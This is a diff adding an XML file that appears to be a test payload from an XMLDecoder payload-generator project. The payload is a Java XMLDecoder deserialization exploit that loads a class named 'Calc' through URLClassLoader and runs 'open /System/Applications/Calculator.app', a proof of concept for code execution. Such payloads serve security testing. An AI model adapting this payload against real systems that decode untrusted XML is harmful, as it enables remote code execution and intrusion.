@@ -1,0 +1,20 @@
+<java>
+    <new class="java.net.URLClassLoader">
+        <array class="java.net.URL" length="1">
+            <void index="0"><object class="java.net.URL"><string>file:///Users/c0ny1/Documents/codebak/xmldecoder-payload-generator/src/test/java/</string></object></void>
+        </array>
+        <void method="loadClass">
+            <string>Calc</string>
+            <void method="getConstructor">
+                <array class="java.lang.Class" length="1">
+                    <void index="0"><class><string>java.lang.String</string></class></void>
+                </array>
+                <void method="newInstance">
+                    <array class="java.lang.Object" length="1">
+                        <void index="0"><string>open /System/Applications/Calculator.app</string></void>
+                    </array>
+                </void>
+            </void>
+        </void>
+    </new>
+</java>
